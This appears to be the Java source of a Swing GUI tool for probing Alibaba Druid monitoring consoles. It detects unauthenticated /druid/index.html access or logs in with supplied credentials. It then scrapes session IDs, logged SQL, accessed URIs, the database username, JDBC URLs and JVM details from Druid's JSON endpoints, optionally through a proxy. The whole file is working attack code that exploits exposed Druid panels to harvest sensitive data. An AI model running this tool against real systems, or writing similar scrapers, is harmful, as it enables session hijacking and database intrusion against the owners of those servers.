import com.alibaba.fastjson2.JSON;
import com.alibaba.fastjson2.JSONArray;
import com.alibaba.fastjson2.JSONException;
import com.alibaba.fastjson2.JSONObject;
import me.gv7.woodpecker.requests.Proxies;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.net.Proxy;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class GUI {
    public JPanel rootJPanel;
    private JTextField textURL;
    private JTextField textUserName;
    private JTextField textPassWord;
    private JButton runButton;
    private JTextArea textHeader;
    private JTextField textProxy;
    private JTextArea textJDBC;
    private JTextArea textSessions;
    private JTextArea textSqls;
    private JTextArea textUrls;
    private JLabel logs;

    public GUI() {
        runButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                clearText();
                logs.setText("");
                String url = textURL.getText().replaceFirst("/$", "");

                if (!textUserName.getText().isEmpty() && !textPassWord.getText().isEmpty()){
                    String cookie = Login(url);
                    if (!cookie.isEmpty()) {
                        getResult(url, cookie);
                    }
                    logs.setText("程序执行完成...");
                    return;
                }

                int code = httpGet(url + "/druid/index.html", "").statusCode();
                if (code == 200) {
                    getResult(url, "");
                } else if (code == 302){
                    clearText();
                    showError("靓仔、Druid 需要登录哦~");
                } else {
                    clearText();
                    showError("访问失败: "+code+" ，请检查URL是否正确");
                }

                logs.setText("程序执行完成...");
            }
        });
    }

    private void getResult(String url, String cookie) {
        String webSession = url + "/druid/websession.json";
        String webSql = url + "/druid/sql.json";
        String webUri = url + "/druid/weburi.json";
        String webDb = url + "/druid/datasource.json";
        String basic = url + "/druid/basic.json";

        this.textSessions.setText(getDruidJson(httpGet(webSession, cookie).readToText(), "SESSIONID"));

        this.textSqls.setText(getDruidJson(httpGet(webSql, cookie).readToText(), "SQL"));

        this.textUrls.setText(getDruidJson(httpGet(webUri, cookie).readToText(), "URI"));

        String webDbRes = httpGet(webDb, cookie).readToText();
        String basicRes = httpGet(basic, cookie).readToText();

        Map<String, String> info = new HashMap<>();
        info.put("userName", getDruidJson(webDbRes, "UserName"));
        info.put("jdbcUrl", getDruidJson(webDbRes, "URL"));
        info.put("javaClassPath", getDruidJson(basicRes, "JavaClassPath"));
        info.put("javaVMName", getDruidJson(basicRes, "JavaVMName"));
        info.put("javaVersion", getDruidJson(basicRes, "JavaVersion"));


        for (Map.Entry<String, String> entry : info.entrySet()) {
            String key = entry.getKey();
            String value = entry.getValue();

            // 输出字段名和值
            if (!value.isEmpty()) { // 只有值不为空时才输出
                this.textJDBC.append(key + ": " + value);
            }
        }

    }

    private String getDruidJson(String body, String fieldName) {
        StringBuilder result = new StringBuilder();
        try {
            JSONObject root = JSON.parseObject(body);
            JSONArray contentArray = root.getJSONArray("Content");

            if (contentArray == null || contentArray.isEmpty()) {
                return "";
            }

            for (int i = 0; i < contentArray.size(); i++) {
                JSONObject item = contentArray.getJSONObject(i);
                if (item.containsKey(fieldName)) {
                    String value = item.getString(fieldName);
                    if (value != null) {
                        // 统一清理特殊字符
                        value = value.replace("\n", " ").replace("\t", " ").replace("\\n", "");
                        result.append(value).append("\n");
                    }
                }
            }

        } catch (JSONException e) {
            e.printStackTrace();
            return "";
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }

        return result.toString();
    }

    private RawResponse httpGet(String url, String cookie) {
        Map<String, Object> headers = parseHeaders();
        if (!cookie.isEmpty()){
            headers.put("Cookie",cookie);
        }

        Proxy proxy = convertToProxy();

        RawResponse resp = Requests.get(url).headers(headers).proxy(proxy).verify(false).timeout(10000).send();
        return resp;
    }

    private String Login(String url) {
        Map<String, Object> params = new HashMap<>();
        params.put("loginUsername", textUserName.getText());
        params.put("loginPassword", textPassWord.getText());

        Proxy proxy = convertToProxy();
        Map<String, Object> headers = parseHeaders();

        RawResponse resp = Requests.post(url + "/druid/submitLogin").body(params).headers(headers).proxy(proxy).verify(false).send();
        if (resp.getHeader("Set-Cookie") == null) {
            clearText();
            showError(resp.readToText());
            return "";
        }
        return resp.getHeader("Set-Cookie");
    }

    private Map<String, Object> parseHeaders() {
        String input = textHeader.getText();
        Map<String, Object> headers = new HashMap<>();
        String[] lines = input.split("\\r?\\n");

        for (String line : lines) {
            if (line.trim().isEmpty()) continue;
            String[] parts = line.split(":", 2);
            if (parts.length == 2) {
                String key = parts[0].trim();
                String value = parts[1].trim();
                headers.put(key, value);
            }
        }

        return headers;
    }

    private Proxy convertToProxy() {
        String input = textProxy.getText().trim();

        if (input.isEmpty()){
            return Proxy.NO_PROXY;
        }

        // 支持 http://127.0.0.1:8080/ 或 127.0.0.1:8080
        Pattern pattern = Pattern.compile("(?:(?:http|https)://)?([\\w.]+):(\\d+)");
        Matcher matcher = pattern.matcher(input);

        if (matcher.find()) {
            String host = matcher.group(1);
            String port = matcher.group(2);
            return Proxies.httpProxy(host, Integer.parseInt(port));
        } else {
            showError("无法识别代理地址格式");
            return Proxy.NO_PROXY;
        }
    }


    private void clearText() {
        textJDBC.setText("");
        textSqls.setText("");
        textUrls.setText("");
        textSessions.setText("");
    }

    private void showError(String error) {
        JOptionPane.showMessageDialog(null, error, "", 0);
    }
}
